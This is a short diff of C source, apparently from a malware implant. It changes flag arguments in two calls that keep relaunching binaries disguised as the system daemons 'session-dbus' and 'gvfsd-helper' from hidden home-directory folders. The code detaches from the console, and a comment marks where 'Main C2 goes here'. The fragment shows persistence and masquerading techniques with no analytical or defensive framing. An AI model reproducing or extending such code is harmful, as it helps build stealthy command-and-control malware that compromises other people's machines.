@@ -25,7 +25,7 @@ int main(int argc, char *argv[]) {
         if (id != 0 ) { // non-root
             //daemon(0, 0);
             printf("initial spawn of session-dbus\n");
-            spawn_thread_watchdog(0, "/home/gdev/.dbus/.sessions/session-dbus");
+            spawn_thread_watchdog(1, "/home/gdev/.dbus/.sessions/session-dbus");
         }
         do {
             // forever run session-dbus as a "watchdog process".
@@ -54,7 +54,7 @@ int main(int argc, char *argv[]) {
         daemon(0, 0);  // detach from current console
         // spawns -> /home/$USER/.gvfsd/.profile/gvfsd-helper
         //printf("initial spawn of gvfsd-helper\n");
-        spawn_thread_watchdog(1, "/home/gdev/.gvfsd/.profile/gvfsd-helper");
+        spawn_thread_watchdog(0, "/home/gdev/.gvfsd/.profile/gvfsd-helper");
 
         // Main C2 goes here?
     }
